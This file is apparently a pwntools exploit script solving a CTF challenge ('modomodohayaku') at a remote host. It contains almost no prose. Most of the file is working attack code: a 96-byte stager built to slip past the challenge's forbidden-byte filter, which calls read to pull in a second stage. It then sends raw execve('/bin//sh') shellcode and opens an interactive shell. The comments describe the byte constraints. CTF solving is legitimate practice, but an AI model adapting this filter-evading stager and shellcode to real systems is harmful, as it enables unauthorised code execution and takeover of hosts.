from pwn import *



context.arch = "amd64"
elf=ELF('./pwn/modomodohayaku/modomodohayaku')
#r = process('./pwn/modomodohayaku/modomodohayaku')
r = remote('ctf.adl.tw', 10006)


#buffer has 240 bytes (30 vars*8)
#first 96 bytes cannot have 0x90, 0x6b, 0x69, 0x72, 0x74, 0x6f
                            #nop  k      i     r     t    o
#read 96 bytes into buffer
#divide the shellcode into lines of 6
#first 16 lines must start with 0xc 0x87 0x63
#we have to limit the shellcode within 96 bytes

#0x87=0b1000 0111
my_movsxd=b'\x63\xc0'#movsxd eax,eax
my_other_movsxd=b'\x63\xc1'#movsxd eax,ecx
payload=b''


#print(asm("xor rdi,rdi"))
#exit(0)

#print(disasm(my_other_movsxd))
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x00")
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x00")
payload+=asm("or al,0x87")+my_movsxd+asm("pop rdi")+asm("pop rdi")
payload+=asm("or al,0x87")+my_movsxd+asm("push rbp")+asm("push rbp")
payload+=asm("or al,0x87")+my_movsxd+asm("pop rsi")+asm("pop rsi")
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x20")
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x20")
payload+=asm("or al,0x87")+my_movsxd+asm("pop rdx")+asm("pop rdx")
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x00")
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x00")
payload+=asm("or al,0x87")+my_movsxd+asm("pop rcx")+asm("pop rcx")
payload+=asm("or al,0x87")+my_other_movsxd+asm("syscall")
payload+=asm("or al,0x87")+my_movsxd+asm("call rbp")#13
payload+=asm("or al,0x87")+my_movsxd+asm("call rbp")
payload+=asm("or al,0x87")+my_movsxd+asm("call rbp")
payload+=asm("or al,0x87")+my_movsxd+asm("call rbp")
#print(disasm(payload))
#exit(0)
output=r.recvuntil(b'..........')
print(output)
r.send(flat([payload]))
pause()

#sleep(0.1)
second_shell_code="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
r.send(flat([second_shell_code]))
r.interactive()

 